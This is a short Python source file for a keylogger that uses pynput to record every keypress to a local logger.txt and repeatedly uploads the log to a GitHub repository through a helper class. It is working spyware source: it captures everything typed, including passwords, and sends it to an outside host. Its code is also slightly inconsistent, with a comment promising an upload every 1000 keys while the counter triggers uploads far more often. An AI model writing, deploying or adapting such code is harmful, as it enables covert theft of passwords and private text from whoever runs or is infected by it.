import pynput.keyboard as keyboard
from pynput.keyboard import Listener
from localdata_dir import create_dir
from github_helper import GithubHelper


def keylogger(key):
    counter = 0
    folder_path = create_dir()

    with open(f"{folder_path}\\logger.txt", 'a') as file:
        if key == keyboard.Key.enter:
            file.write('\n')
        elif key == keyboard.Key.space:
            file.write(' ')
        else:
            file.write(str(key).strip("''"))
            counter += 1
        if counter % 10 == 0:
            # Upload the file to the repository every 1000 keys
            with open(f"{folder_path}\\logger.txt", 'r') as log_file:
                content = log_file.read()
            github_helper = GithubHelper()
            try:
                existing_sha = github_helper.get_sha("pythontest", "logger.txt")
                github_helper.create_file("pythontest", "logger.txt", "Log keys", content, sha=existing_sha)
            except Exception as e:
                print("Exception occurred during file creation:", e)

        # For testing purposes only, if press esc the keylogger will stop
        if key == keyboard.Key.esc:  # Check if the "Esc" key is pressed
            listener.stop()  # Terminate the listener


with Listener(on_press=keylogger) as listener:
    listener.join()
